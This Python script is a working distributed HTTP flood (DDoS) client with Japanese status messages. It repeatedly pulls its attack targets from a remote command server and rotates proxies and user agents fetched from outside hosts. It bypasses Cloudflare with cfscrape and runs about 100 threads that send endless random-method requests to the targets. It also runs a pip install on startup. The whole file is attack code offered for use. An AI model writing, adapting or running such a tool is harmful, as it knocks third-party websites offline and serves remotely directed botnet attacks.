import requests
import cfscrape
import random
import string
import time
import threading
import sys
import os
os.system("pip3 install -U requests[socks]")
import requests
global targets
targets = ["0"]
import urllib3
urllib3.disable_warnings()

print("IPリストを取得しています...")
global proxylist
try:proxylist = requests.get("https://anondiscord.xyz/proxylist.php").text.split("\n")
except:proxylist = [""]
print("IPリストの取得が完了しました。")

global useragents
useragents = requests.get("https://raw.githubusercontent.com/akgjbneksmakelsk/uas/main/ua.txt").text.split("\n")

def randomstr(n=15):
   return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def randomint(n=15):
   return ''.join(random.choices(string.digits, k=n))

def requester():
    time.sleep(10)
    print("run!")
    global useragents
    global targets
    while True:
        if targets[0] == "0":time.sleep(5);continue
        target = random.choice(targets).replace("%random%",randomstr()).replace("%rand%",randomstr()).replace("%randint%",randomint()).replace("%randnum%",randomint())
        proxy = random.choice(proxylist)
        if proxy == "":time.sleep(5);continue
        s = cfscrape.create_scraper()
        try:
            useragent = random.choice(useragents)
            s.headers={"User-Agent": useragent}
            s.stream=True
            rdn = random.randint(1,7)
            if rdn == 1:
                s.get(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
            if rdn == 2:
                s.options(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
            if rdn == 3:
                s.head(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
            if rdn == 4:
                s.post(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
            if rdn == 5:
                s.put(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
            if rdn == 6:
                s.patch(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
            if rdn == 7:
                s.delete(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
            print("ok")
        except:pass

def gettargets():
    global targets
    global useragents
    while True:
        try:
            print("useragentを更新中...")
            useragents = requests.get("https://raw.githubusercontent.com/akgjbneksmakelsk/uas/main/ua.txt").text.split("\n")
            print("完了\n攻撃先一覧を取得中...")
            res = requests.get("https://anbn.attackblock.xyz/?nr&dproxy")
            if res.status_code == 200:targets = res.text.split(",");print("完了")
        except:pass
        time.sleep(1)


def proxyreloader():
    while True:
        global proxylist
        print("IPリストを更新しています...")
        try:proxylist = requests.get("https://anondiscord.xyz/proxylist.php").text.split("\n")
        except:print("IPリストを更新できませんでした")
        print("IPリストを更新しました")
        time.sleep(5)


threading.Thread(target=proxyreloader).start()

def thread_starter():
    threading.Thread(target=gettargets).start()
    for _ in range(100):
        threading.Thread(target=requester).start()

threading.Thread(target=thread_starter).start()
requester()
